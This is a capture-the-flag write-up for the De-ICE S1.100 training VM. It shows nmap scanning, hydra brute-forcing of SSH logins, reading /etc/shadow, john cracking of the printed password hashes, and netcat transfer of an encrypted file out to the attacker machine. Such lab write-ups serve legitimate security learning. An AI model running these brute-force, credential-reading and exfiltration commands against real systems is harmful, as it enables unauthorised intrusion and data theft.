# De-ICE: S1.100 - write-up

https://www.vulnhub.com/entry/de-ice_s1100-level-1,8/

We first do a `netdiscover` to find the lab's VM and `nmap 192.168.1.100` to find open ports, or better a more comprehensive scan `nmap -sS -Pn -sV -O -A -p- 192.168.1.100`. This was one of my earlier challenges that I didnt write-up, but most of referenced to the walkthroughs

We first gather a list of names to attempt to break the ssh login from the http://192.168.1.100/index2.php. There's a neat little script that combines first name and surname into different combinations: https://gist.github.com/superkojiman/11076951. Using this we can use `hydra -L user.txt -P user.txt ssh://192.168.1.100` to check if the user and pass are the same then we can try `hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100`, fortunately we get a match `bbanter:bbanter`. 


So we login with that and we try to get as much information as possible, e.g. `id`, the name of the box, `uname -a`, running processes `ps aux`, `ps aux | grep root, `netstat -antup`, `cat /etc/passwd`, `cat /etc/group`, `cat /etc/shadow`. From the passwd, we can see that aadams is in the wheel group, this has special commands that he can execute. We then perform another bruteforce hydra attack with `hydra -l aadams -P /usr/share/wordlists/rockyou.txt -u 192.168.1.100 ssh` to get aadams:nostradamus. Logging into aadams, we run `sudo -l` to see the what commands he can run. Now we can run `sudo cat /etc/shadow` and use john to crack the hashes. So we save the revelvant entries

```
aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:13550:0:99999:7:::
bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:13550:0:99999:7:::
ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:13550:0:99999:7:::
root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:13553:0:::::
```

to pass.txt and use `john --wordlist:/usr/share/wordlists/rockyou.txt user.txt` to find the root password, tarot. Remember the ftp was broken from nmap, we find find a file at /home/ftp/incoming/salary_dec2003.csv.enc. Trying to ssh as root fails, I guess it is to prevent scp. Instead, we ` nc -lvvp 1234 > salary_dec2003.csv.enc` on our attacker machine and `nc -nvv 192.168.1.88 1234 < salary_dec2003.csv.enc` in the ssh terminal. Alternatively, we can cp it to public folder /var/www/htdocs/ where the website is hosted on and then download onto our attack vm by `wget 192.168.1.100/salary_dec2003.csv.enc`. `binwalk salary_dec2003.csv.enc ` tells us its openssl encrypted, but we do not know the cipher suite or password (maybe tarot from the passwd file). We take a guess and finally decrypt with `openssl enc -d -aes-128-cbc -in salary_dec2003.csv.enc -out salary.csv -k tarot`. DONE!
